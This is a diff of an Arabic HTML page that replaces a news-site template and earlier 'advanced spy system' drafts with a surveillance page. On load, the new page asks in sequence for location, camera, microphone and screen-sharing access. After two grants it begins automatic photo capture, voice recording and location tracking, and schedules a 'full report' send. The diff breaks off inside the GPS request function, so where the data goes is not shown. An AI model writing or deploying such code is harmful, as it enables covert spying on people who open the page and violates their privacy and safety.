@@ -1,863 +1,68 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>الجريدة | أخبار اليوم</title>
-<style>
-*{
-margin:0;
-padding:0;
-box-sizing:border-box;
-font-family:Tahoma,sans-serif;
-}
-
-body{
-background:#f3f3f3;
-color:#222;
-}
-
-header{
-background:#fff;
-padding:20px;
-border-bottom:3px solid #b30000;
-text-align:center;
-}
-
-header h1{
-font-size:40px;
-}
-
-nav{
-background:#111;
-padding:15px;
-display:flex;
-justify-content:center;
-gap:30px;
-flex-wrap:wrap;
-}
-
-nav a{
-color:white;
-text-decoration:none;
-font-weight:bold;
-}
-
-nav a:hover{
-color:#ff3d3d;
-}
-
-.breaking{
-background:#b30000;
-color:#fff;
-padding:12px;
-font-weight:bold;
-overflow:hidden;
-white-space:nowrap;
-}
-
-.breaking span{
-display:inline-block;
-padding-left:100%;
-animation:move 18s linear infinite;
-}
-
-@keyframes move{
-0%{transform:translateX(0);}
-100%{transform:translateX(-200%);}
-}
-
-.container{
-width:92%;
-max-width:1300px;
-margin:auto;
-padding:25px 0;
-}
-
-.hero{
-background:#fff;
-border-radius:8px;
-overflow:hidden;
-box-shadow:0 3px 8px rgba(0,0,0,.08);
-margin-bottom:30px;
-}
-
-.hero img{
-width:100%;
-height:450px;
-object-fit:cover;
-}
-
-.hero h2{
-padding:20px;
-font-size:34px;
-}
-
-.hero p{
-padding:0 20px 20px;
-line-height:1.8;
-}
-
-.grid{
-display:grid;
-grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
-gap:20px;
-}
-
-.card{
-background:white;
-border-radius:8px;
-overflow:hidden;
-box-shadow:0 2px 8px rgba(0,0,0,.08);
-transition:.3s;
-}
-
-.card:hover{
-transform:translateY(-5px);
-}
-
-.card img{
-width:100%;
-height:210px;
-object-fit:cover;
-}
-
-.card h3{
-padding:15px;
-}
-
-.card p{
-padding:0 15px 20px;
-color:#555;
-line-height:1.7;
-}
-
-.section{
-margin:40px 0 20px;
-font-size:28px;
-border-right:5px solid #b30000;
-padding-right:10px;
-}
-
-footer{
-margin-top:50px;
-background:#111;
-color:#fff;
-text-align:center;
-padding:30px;
-}
-</style>
-
-</head>
-<body>
-
-<header>
-<h1>الجريدة</h1>
-<p>بوابة الأخبار العربية</p>
-</header>
-
-<nav>
-<a href="#">الرئيسية</a>
-<a href="#">سياسة</a>
-<a href="#">اقتصاد</a>
-<a href="#">رياضة</a>
-<a href="#">تكنولوجيا</a>
-<a href="#">ثقافة</a>
-</nav>
-
-<div class="breaking">
-<span>
-عاجل | تحديثات جديدة في الأسواق العالمية • أخبار رياضية • أحدث تقنيات الذكاء الاصطناعي • تغطية مباشرة للأحداث
-</span>
-</div>
-
-<div class="container">
-
-<div class="hero">
-<img src="https://images.unsplash.com/photo-1495020689067-958852a7765e?w=1200" alt="">
-<h2>العنوان الرئيسي للجريدة يظهر هنا بشكل احترافي</h2>
-<p>
-هذا مثال لخبر رئيسي في الصفحة الأولى. يمكنك استبدال النص بأي محتوى تريده، وسيظهر بتصميم بسيط ورسمي يشبه مواقع الأخبار.
-</p>
-</div>
-
-<h2 class="section">آخر الأخبار</h2>
-
-<div class="grid">
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1504711434969-e33886168f5c?w=700">
-<h3>الأسواق تشهد تغيرات كبيرة اليوم</h3>
-<p>ملخص سريع للخبر يمكن تعديله بسهولة داخل الكود.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1516321318423-f06f85e504b3?w=700">
-<h3>تطورات جديدة في عالم التكنولوجيا</h3>
-<p>خبر تقني مع صورة من الإنترنت.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1517649763962-0c623066013b?w=700">
-<h3>أبرز نتائج المباريات العالمية</h3>
-<p>آخر الأخبار الرياضية لهذا اليوم.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1520607162513-77705c0f0d4a?w=700">
-<h3>تقارير اقتصادية جديدة</h3>
-<p>ملخص اقتصادي مختصر.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1519389950473-47ba0277781c?w=700">
-<h3>شركات التقنية تعلن مشاريع جديدة</h3>
-<p>تقرير حول أحدث الابتكارات.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1521295121783-8a321d551ad2?w=700">
-<h3>تحقيقات وتقارير خاصة</h3>
-<p>قسم للتقارير والتحليلات.</p>
-</div>
-
-</div>
-
-<h2 class="section">الأكثر قراءة</h2>
-
-<div class="grid">
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1504384308090-c894fdcc538d?w=700">
-<h3>كيف تتغير التكنولوجيا كل يوم؟</h3>
-<p>تقرير خاص.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=700">
-<h3>أفضل الابتكارات الحديثة</h3>
-<p>مقال مميز.</p>
-</div>
-
-<div class="card">
-<img src="https://images.unsplash.com/photo-1486312338219-ce68d2c6f44d?w=700">
-<h3>تحليلات وتقارير يومية</h3>
-<p>آخر التحليلات الإخبارية.</p>
-</div>
-
-</div>
-
-</div>
-
-<footer>
-© 2026 جميع الحقوق محفوظة | الجريدة
-</footer>
-
-<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التجسس المتقدم - الموقع والكاميرا</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
-            min-height: 100vh;
-            padding: 20px;
-            color: white;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 30px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        h1 {
-            text-align: center;
-            color: #00d4ff;
-            margin-bottom: 30px;
-            font-size: 2.5em;
-            border-bottom: 3px solid #00d4ff;
-            padding-bottom: 15px;
-            text-shadow: 0 0 20px rgba(0,212,255,0.3);
-        }
-        
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .status-card {
-            background: rgba(255,255,255,0.1);
-            border-radius: 15px;
-            padding: 20px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
-            transition: all 0.3s;
-        }
-        
-        .status-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0,212,255,0.2);
-        }
-        
-        .status-card .icon {
-            font-size: 3em;
-            margin-bottom: 10px;
-        }
-        
-        .status-card .label {
-            font-size: 0.9em;
-            color: #aaa;
-        }
-        
-        .status-card .value {
-            font-size: 1.2em;
-            font-weight: bold;
-            color: #00d4ff;
-            margin-top: 5px;
-        }
-        
-        .status-card .value.success {
-            color: #00ff88;
-        }
-        
-        .status-card .value.error {
-            color: #ff4757;
-        }
-        
-        .section {
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-right: 5px solid #00d4ff;
-        }
-        
-        .section-title {
-            color: #00d4ff;
-            font-size: 1.3em;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 15px;
-        }
-        
-        .info-item {
-            background: rgba(255,255,255,0.05);
-            padding: 12px 15px;
-            border-radius: 10px;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        
-        .info-label {
-            font-weight: bold;
-            color: #aaa;
-            font-size: 0.85em;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-        
-        .info-value {
-            color: white;
-            font-size: 1em;
-            margin-top: 5px;
-            word-break: break-all;
-        }
-        
-        .info-value.highlight {
-            color: #00d4ff;
-            font-weight: bold;
-        }
-        
-        .info-value.location {
-            color: #ff6b6b;
-            font-weight: bold;
-            font-size: 1.1em;
-        }
-        
-        #map {
-            width: 100%;
-            height: 400px;
-            border-radius: 15px;
-            margin-top: 15px;
-            border: 2px solid #00d4ff;
-        }
-        
-        .loading {
-            text-align: center;
-            padding: 50px;
-            color: #aaa;
-            font-size: 1.2em;
-        }
-        
-        .spinner {
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid #00d4ff;
-            border-radius: 50%;
-            width: 50px;
-            height: 50px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 20px;
-        }
-        
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        .button {
-            background: linear-gradient(135deg, #00d4ff, #0099ff);
-            color: white;
-            border: none;
-            padding: 12px 30px;
-            border-radius: 50px;
-            font-size: 1em;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin: 5px;
-        }
-        
-        .button:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 20px rgba(0,212,255,0.4);
-        }
-        
-        .button.danger {
-            background: linear-gradient(135deg, #ff4757, #ff6b81);
-        }
-        
-        .button.danger:hover {
-            box-shadow: 0 5px 20px rgba(255,71,87,0.4);
-        }
-        
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 640px;
-            margin: 20px auto;
-            border-radius: 15px;
-            overflow: hidden;
-            background: #000;
-        }
-        
-        #video {
-            width: 100%;
-            display: none;
-        }
-        
-        #video.active {
-            display: block;
-        }
-        
-        #canvas {
-            display: none;
-        }
-        
-        .permission-list {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 10px;
-            margin-top: 10px;
-        }
-        
-        .permission-item {
-            background: rgba(255,255,255,0.05);
-            padding: 10px;
-            border-radius: 10px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        
-        .permission-item .status {
-            font-size: 1.5em;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px;
-            }
-            .info-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-    </style>
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التجسس المتقدم - تصوير تلقائي مستمر</title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
-            min-height: 100vh;
-            padding: 20px;
-            color: white;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 30px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        h1 {
-            text-align: center;
-            color: #00ff88;
-            margin-bottom: 30px;
-            font-size: 2.5em;
-            border-bottom: 3px solid #00ff88;
-            padding-bottom: 15px;
-            text-shadow: 0 0 30px rgba(0,255,136,0.3);
-        }
-        
-        .status-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }
-        
-        .status-card {
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
-            padding: 15px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.05);
-            transition: all 0.3s;
-        }
-        
-        .status-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(0,255,136,0.15);
-        }
-        
-        .status-card .icon {
-            font-size: 2.5em;
-            margin-bottom: 5px;
-        }
-        
-        .status-card .label {
-            font-size: 0.8em;
-            color: #aaa;
-        }
-        
-        .status-card .value {
-            font-size: 1.1em;
-            font-weight: bold;
-            margin-top: 5px;
-        }
-        
-        .status-card .value.success {
-            color: #00ff88;
-        }
-        
-        .status-card .value.error {
-            color: #ff4757;
-        }
-        
-        .status-card .value.waiting {
-            color: #ffa502;
-        }
-        
-        .controls {
-            display: flex;
-            flex-wrap: wrap;
-            gap: 10px;
-            justify-content: center;
-            margin: 20px 0;
-        }
-        
-        .btn {
-            background: linear-gradient(135deg, #00ff88, #00cc66);
-            color: #0a0a0a;
-            border: none;
-            padding: 12px 25px;
-            border-radius: 50px;
-            font-size: 1em;
-            font-weight: bold;
-            cursor: pointer;
-            transition: all 0.3s;
-        }
-        
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 5px 25px rgba(0,255,136,0.4);
-        }
-        
-        .btn.danger {
-            background: linear-gradient(135deg, #ff4757, #ff6b81);
-            color: white;
-        }
-        
-        .btn.danger:hover {
-            box-shadow: 0 5px 25px rgba(255,71,87,0.4);
-        }
-        
-        .btn.warning {
-            background: linear-gradient(135deg, #ffa502, #ff6348);
-            color: white;
-        }
-        
-        .btn.warning:hover {
-            box-shadow: 0 5px 25px rgba(255,165,2,0.4);
-        }
-        
-        .video-container {
-            position: relative;
-            width: 100%;
-            max-width: 800px;
-            margin: 20px auto;
-            border-radius: 15px;
-            overflow: hidden;
-            background: #000;
-            border: 2px solid rgba(0,255,136,0.2);
-        }
-        
-        #video {
-            width: 100%;
-            display: none;
-        }
-        
-        #video.active {
-            display: block;
-        }
-        
-        #canvas {
-            display: none;
-        }
-        
-        .section {
-            background: rgba(255,255,255,0.03);
-            border-radius: 15px;
-            padding: 20px;
-            margin-bottom: 20px;
-            border-right: 4px solid #00ff88;
-        }
-        
-        .section-title {
-            color: #00ff88;
-            font-size: 1.2em;
-            margin-bottom: 15px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .info-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
-            gap: 10px;
-        }
-        
-        .info-item {
-            background: rgba(255,255,255,0.03);
-            padding: 10px 15px;
-            border-radius: 10px;
-            border: 1px solid rgba(255,255,255,0.03);
-        }
-        
-        .info-label {
-            font-weight: bold;
-            color: #888;
-            font-size: 0.8em;
-            text-transform: uppercase;
-        }
-        
-        .info-value {
-            color: white;
-            font-size: 0.95em;
-            margin-top: 3px;
-            word-break: break-all;
-        }
-        
-        .info-value.highlight {
-            color: #00ff88;
-            font-weight: bold;
-        }
-        
-        #map {
-            width: 100%;
-            height: 350px;
-            border-radius: 15px;
-            margin-top: 10px;
-            border: 2px solid rgba(0,255,136,0.2);
-        }
-        
-        .log-container {
-            max-height: 300px;
-            overflow-y: auto;
-            background: rgba(0,0,0,0.5);
-            border-radius: 10px;
-            padding: 15px;
-            font-family: 'Courier New', monospace;
-            font-size: 0.85em;
-            border: 1px solid rgba(0,255,136,0.1);
-        }
-        
-        .log-entry {
-            padding: 5px 0;
-            border-bottom: 1px solid rgba(255,255,255,0.05);
-            color: #aaa;
-        }
-        
-        .log-entry .time {
-            color: #00ff88;
-        }
-        
-        .log-entry .success {
-            color: #00ff88;
-        }
-        
-        .log-entry .error {
-            color: #ff4757;
-        }
-        
-        .log-entry .info {
-            color: #ffa502;
-        }
-        
-        ::-webkit-scrollbar {
-            width: 6px;
-        }
-        
-        ::-webkit-scrollbar-track {
-            background: rgba(255,255,255,0.05);
-            border-radius: 10px;
-        }
-        
-        ::-webkit-scrollbar-thumb {
-            background: #00ff88;
-            border-radius: 10px;
-        }
-        
-        @media (max-width: 768px) {
-            .container {
-                padding: 15px;
-            }
-            .info-grid {
-                grid-template-columns: 1fr;
-            }
-            .controls {
-                flex-direction: column;
-                align-items: center;
-            }
-            .btn {
-                width: 100%;
-                text-align: center;
-            }
-        }
-    </style>
-</head>
-<body>
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام المراقبة</title>
+    <title>نظام المراقبة التلقائي</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #0c0c1d, #1a1a3e);
+            font-family: 'Segoe UI', sans-serif;
+            background: #0a0a1a;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            padding: 20px;
-        }
-        .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
-            border-radius: 24px;
-            padding: 35px;
-            max-width: 480px;
-            width: 100%;
-            border: 1px solid rgba(255,255,255,0.1);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
             color: white;
         }
-        h1 {
+        .container {
+            background: rgba(255,255,255,0.03);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 450px;
+            width: 100%;
+            border: 1px solid rgba(255,255,255,0.05);
             text-align: center;
-            font-size: 26px;
-            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
+        }
+        h1 {
+            font-size: 28px;
+            background: linear-gradient(135deg, #00d2ff, #7b2ffc);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            margin-bottom: 5px;
+            margin-bottom: 10px;
         }
         .subtitle {
-            text-align: center;
-            color: #888;
+            color: #666;
             font-size: 13px;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
         }
         #statusBox {
-            background: rgba(0,0,0,0.3);
-            padding: 18px;
-            border-radius: 14px;
+            background: rgba(0,0,0,0.4);
+            padding: 25px;
+            border-radius: 16px;
             margin-bottom: 20px;
-            text-align: center;
-            min-height: 75px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            flex-direction: column;
             border: 1px solid rgba(255,255,255,0.05);
         }
         #statusText {
-            font-size: 16px;
+            font-size: 20px;
             font-weight: bold;
-            color: #fff;
+            display: block;
+            margin-bottom: 8px;
         }
         #statusDetail {
-            font-size: 13px;
-            color: #aaa;
-            margin-top: 5px;
+            font-size: 14px;
+            color: #888;
         }
         .status-dot {
             display: inline-block;
-            width: 14px;
-            height: 14px;
+            width: 16px;
+            height: 16px;
             border-radius: 50%;
             margin-right: 10px;
             vertical-align: middle;
         }
-        .dot-idle { background: #666; }
-        .dot-waiting { background: #f39c12; animation: pulse 1s infinite; }
+        .dot-idle { background: #555; }
+        .dot-loading { background: #f39c12; animation: pulse 1s infinite; }
         .dot-success { background: #2ecc71; animation: pulse 1.5s infinite; }
         .dot-error { background: #e74c3c; }
         @keyframes pulse {
@@ -865,120 +70,79 @@ padding:30px;
             50% { opacity: 0.5; transform: scale(0.8); }
             100% { opacity: 1; transform: scale(1); }
         }
-        
-        #startBtn {
-            width: 100%;
-            padding: 18px;
-            font-size: 18px;
-            font-weight: bold;
-            border: none;
-            border-radius: 14px;
-            cursor: pointer;
-            background: linear-gradient(135deg, #00d2ff, #3a7bd5);
-            color: white;
-            transition: all 0.3s;
-            margin-bottom: 20px;
+        .perm-list {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            margin: 20px 0;
         }
-        #startBtn:hover { transform: scale(1.02); box-shadow: 0 5px 25px rgba(0,210,255,0.3); }
-        #startBtn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
-        
-        .permissions-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin: 15px 0;
-        }
-        .perm-item {
+        .perm-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
             background: rgba(0,0,0,0.3);
-            padding: 12px 10px;
-            border-radius: 12px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.05);
+            padding: 12px 18px;
+            border-radius: 10px;
+            border-left: 3px solid #555;
             transition: all 0.3s;
         }
-        .perm-item .icon { font-size: 24px; display: block; margin-bottom: 3px; }
-        .perm-item .label { color: #888; font-size: 11px; display: block; }
-        .perm-item .status { font-weight: bold; font-size: 14px; margin-top: 3px; display: block; }
-        .perm-item .status.pending { color: #f39c12; }
-        .perm-item .status.granted { color: #2ecc71; }
-        .perm-item .status.denied { color: #e74c3c; }
-        .perm-item .status.waiting { color: #3498db; animation: pulse 1s infinite; }
-        
+        .perm-row .icon { font-size: 20px; margin-right: 10px; }
+        .perm-row .name { flex: 1; text-align: left; font-size: 14px; color: #ccc; }
+        .perm-row .status-badge { font-size: 12px; padding: 3px 12px; border-radius: 20px; }
+        .badge-waiting { background: #f39c12; color: #000; }
+        .badge-granted { background: #2ecc71; color: #000; }
+        .badge-denied { background: #e74c3c; color: #fff; }
+        .badge-pending { background: #3498db; color: #fff; animation: pulse 1s infinite; }
+        .perm-row.granted { border-left-color: #2ecc71; }
+        .perm-row.denied { border-left-color: #e74c3c; }
+        .perm-row.pending { border-left-color: #f39c12; }
         #stats {
             background: rgba(0,0,0,0.3);
             padding: 12px;
-            border-radius: 12px;
-            text-align: center;
-            font-size: 14px;
-            margin-top: 10px;
-            color: #00d2ff;
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-        .progress-bar {
-            width: 100%;
-            height: 4px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 2px;
+            border-radius: 10px;
+            font-size: 13px;
+            color: #666;
             margin-top: 15px;
-            overflow: hidden;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #00d2ff, #3a7bd5);
-            transition: width 0.5s;
-            width: 0%;
-            border-radius: 2px;
         }
         .footer {
-            text-align: center;
             font-size: 11px;
-            color: #555;
-            margin-top: 15px;
+            color: #444;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>📡 نظام المراقبة</h1>
-        <div class="subtitle">يطلب صلاحية واحدة ورا التانية</div>
+        <div class="subtitle">يطلب الصلاحيات تلقائياً من النظام</div>
         
         <div id="statusBox">
             <span class="status-dot dot-idle" id="statusDot"></span>
-            <span id="statusText">🔴 في انتظار البدء</span>
-            <div id="statusDetail">اضغط زر البدء لبدء طلب الصلاحيات</div>
+            <span id="statusText">⏳ جاري التحميل...</span>
+            <div id="statusDetail">سيتم طلب الصلاحيات تلقائياً</div>
         </div>
         
-        <button id="startBtn">🚀 بدء طلب الصلاحيات</button>
-        
-        <div class="permissions-grid">
-            <div class="perm-item" id="permCam">
-                <span class="icon">📷</span>
-                <span class="label">الكاميرا</span>
-                <span class="status pending" id="camStatus">⏳ في الانتظار</span>
+        <div class="perm-list" id="permList">
+            <div class="perm-row pending" id="rowGps">
+                <span><span class="icon">📍</span><span class="name">الموقع الجغرافي</span></span>
+                <span class="status-badge badge-pending" id="badgeGps">⏳ في الانتظار</span>
             </div>
-            <div class="perm-item" id="permMic">
-                <span class="icon">🎤</span>
-                <span class="label">الميكروفون</span>
-                <span class="status pending" id="micStatus">⏳ في الانتظار</span>
+            <div class="perm-row pending" id="rowCam">
+                <span><span class="icon">📷</span><span class="name">الكاميرا</span></span>
+                <span class="status-badge badge-pending" id="badgeCam">⏳ في الانتظار</span>
             </div>
-            <div class="perm-item" id="permGps">
-                <span class="icon">📍</span>
-                <span class="label">الموقع</span>
-                <span class="status pending" id="gpsStatus">⏳ في الانتظار</span>
+            <div class="perm-row pending" id="rowMic">
+                <span><span class="icon">🎤</span><span class="name">الميكروفون</span></span>
+                <span class="status-badge badge-pending" id="badgeMic">⏳ في الانتظار</span>
             </div>
-            <div class="perm-item" id="permScreen">
-                <span class="icon">🖥️</span>
-                <span class="label">الشاشة</span>
-                <span class="status pending" id="screenStatus">⏳ في الانتظار</span>
+            <div class="perm-row pending" id="rowScreen">
+                <span><span class="icon">🖥️</span><span class="name">مشاركة الشاشة</span></span>
+                <span class="status-badge badge-pending" id="badgeScreen">⏳ في الانتظار</span>
             </div>
-        </div>
-        
-        <div class="progress-bar">
-            <div class="progress-fill" id="progressFill"></div>
         </div>
         
         <div id="stats">📸 صور: 0 | 🎙️ فويس: 0 | 📍 موقع: 0</div>
-        <div class="footer">✅ يطلب صلاحية واحدة ورا التانية</div>
+        <div class="footer">✅ يطلب كل صلاحية تلقائياً بعد الموافقة على السابقة</div>
     </div>
 
     <script>
@@ -1002,86 +166,97 @@ padding:30px;
         let audioCount = 0;
         let locationCount = 0;
         let isFront = false;
-        let permissionStep = 0;
-        let allPermissionsGranted = false;
+        let allDone = false;
         
-        // حالة الصلاحيات
         let perms = { gps: false, cam: false, mic: false, screen: false };
         
         // ============================================================
         // عناصر الواجهة
         // ============================================================
-        const startBtn = document.getElementById('startBtn');
         const statusText = document.getElementById('statusText');
         const statusDetail = document.getElementById('statusDetail');
         const statusDot = document.getElementById('statusDot');
-        const progressFill = document.getElementById('progressFill');
         const statsEl = document.getElementById('stats');
         
-        const camStatus = document.getElementById('camStatus');
-        const micStatus = document.getElementById('micStatus');
-        const gpsStatus = document.getElementById('gpsStatus');
-        const screenStatus = document.getElementById('screenStatus');
+        const badgeGps = document.getElementById('badgeGps');
+        const badgeCam = document.getElementById('badgeCam');
+        const badgeMic = document.getElementById('badgeMic');
+        const badgeScreen = document.getElementById('badgeScreen');
+        
+        const rowGps = document.getElementById('rowGps');
+        const rowCam = document.getElementById('rowCam');
+        const rowMic = document.getElementById('rowMic');
+        const rowScreen = document.getElementById('rowScreen');
 
         // ============================================================
         // تحديث الواجهة
         // ============================================================
         function updateUI() {
-            // تحديث حالة كل صلاحية
-            camStatus.textContent = perms.cam ? '✅ تم التفعيل' : '⏳ في الانتظار';
-            camStatus.className = `status ${perms.cam ? 'granted' : 'pending'}`;
-            
-            micStatus.textContent = perms.mic ? '✅ تم التفعيل' : '⏳ في الانتظار';
-            micStatus.className = `status ${perms.mic ? 'granted' : 'pending'}`;
-            
-            gpsStatus.textContent = perms.gps ? '✅ تم التفعيل' : '⏳ في الانتظار';
-            gpsStatus.className = `status ${perms.gps ? 'granted' : 'pending'}`;
-            
-            screenStatus.textContent = perms.screen ? '✅ تم التفعيل' : '⏳ في الانتظار';
-            screenStatus.className = `status ${perms.screen ? 'granted' : 'pending'}`;
-            
-            // تحديث شريط التقدم
-            const count = Object.values(perms).filter(v => v === true).length;
-            const progress = (count / 4) * 100;
-            progressFill.style.width = progress + '%';
+            // تحديث كل صف
+            updateRow(rowGps, badgeGps, perms.gps);
+            updateRow(rowCam, badgeCam, perms.cam);
+            updateRow(rowMic, badgeMic, perms.mic);
+            updateRow(rowScreen, badgeScreen, perms.screen);
             
             statsEl.textContent = `📸 صور: ${photoCount} | 🎙️ فويس: ${audioCount} | 📍 موقع: ${locationCount}`;
         }
+        
+        function updateRow(row, badge, granted) {
+            if (granted) {
+                row.className = 'perm-row granted';
+                badge.textContent = '✅ تم التفعيل';
+                badge.className = 'status-badge badge-granted';
+            } else if (row.className.includes('pending')) {
+                // خلاص
+            }
+        }
+        
+        function setRowPending(row, badge, text) {
+            row.className = 'perm-row pending';
+            badge.textContent = text || '⏳ جاري...';
+            badge.className = 'status-badge badge-pending';
+        }
+        
+        function setRowDenied(row, badge) {
+            row.className = 'perm-row denied';
+            badge.textContent = '❌ مرفوض';
+            badge.className = 'status-badge badge-denied';
+        }
+
+        function setStatus(text, detail, type) {
+            statusText.textContent = text;
+            if (detail) statusDetail.textContent = detail;
+            if (type === 'loading') statusDot.className = 'status-dot dot-loading';
+            else if (type === 'success') statusDot.className = 'status-dot dot-success';
+            else if (type === 'error') statusDot.className = 'status-dot dot-error';
+            else statusDot.className = 'status-dot dot-idle';
+        }
 
         // ============================================================
-        // طلب الصلاحيات واحدة ورا التانية
+        // طلب الصلاحيات تلقائياً واحدة ورا التانية
         // ============================================================
-        async function requestPermissionsSequential() {
-            permissionStep = 0;
-            allPermissionsGranted = false;
+        async function requestAllPermissions() {
+            setStatus('⏳ جاري طلب الصلاحيات...', 'سيتم طلب كل صلاحية تلو الأخرى', 'loading');
             
-            startBtn.disabled = true;
-            startBtn.textContent = '⏳ جاري طلب الصلاحيات...';
-            
-            // 1. أولاً: الموقع
+            // 1. الموقع
             await requestGPS();
             
-            // 2. ثانياً: الكاميرا
+            // 2. الكاميرا
             await requestCamera();
             
-            // 3. ثالثاً: الميكروفون
+            // 3. الميكروفون
             await requestMic();
             
-            // 4. رابعاً: الشاشة
+            // 4. الشاشة
             await requestScreen();
             
             // التحقق من النتيجة
             const granted = Object.values(perms).filter(v => v === true).length;
             
             if (granted >= 2) {
-                allPermissionsGranted = true;
+                allDone = true;
                 isRunning = true;
-                statusDot.className = 'status-dot dot-success';
-                statusText.textContent = '✅ تم تفعيل الصلاحيات! بدء التشغيل...';
-                statusDetail.textContent = `✅ تم تفعيل ${granted} من 4 صلاحيات`;
-                
-                startBtn.textContent = '✅ يعمل';
-                startBtn.style.background = 'linear-gradient(135deg, #2ecc71, #27ae60)';
+                setStatus('✅ تم تفعيل الصلاحيات', `تم تفعيل ${granted} من 4 صلاحيات`, 'success');
                 
                 // بدء التشغيل
                 startAutoCapture();
@@ -1089,29 +264,20 @@ padding:30px;
                 startAutoVoice();
                 trackLocation();
                 
-                // إرسال تقرير فوري
-                setTimeout(() => sendFullReport(), 2000);
-                
+                setTimeout(() => sendFullReport(), 3000);
             } else {
-                statusDot.className = 'status-dot dot-error';
-                statusText.textContent = '❌ فشل تفعيل الصلاحيات';
-                statusDetail.textContent = 'يرجى السماح بالصلاحيات المطلوبة';
-                startBtn.disabled = false;
-                startBtn.textContent = '🔄 إعادة المحاولة';
+                setStatus('❌ فشل تفعيل الصلاحيات', 'الرجاء السماح بالصلاحيات المطلوبة', 'error');
             }
             
             updateUI();
         }
 
         // ============================================================
-        // 1. طلب الموقع
+        // 1. الموقع
         // ============================================================
         async function requestGPS() {
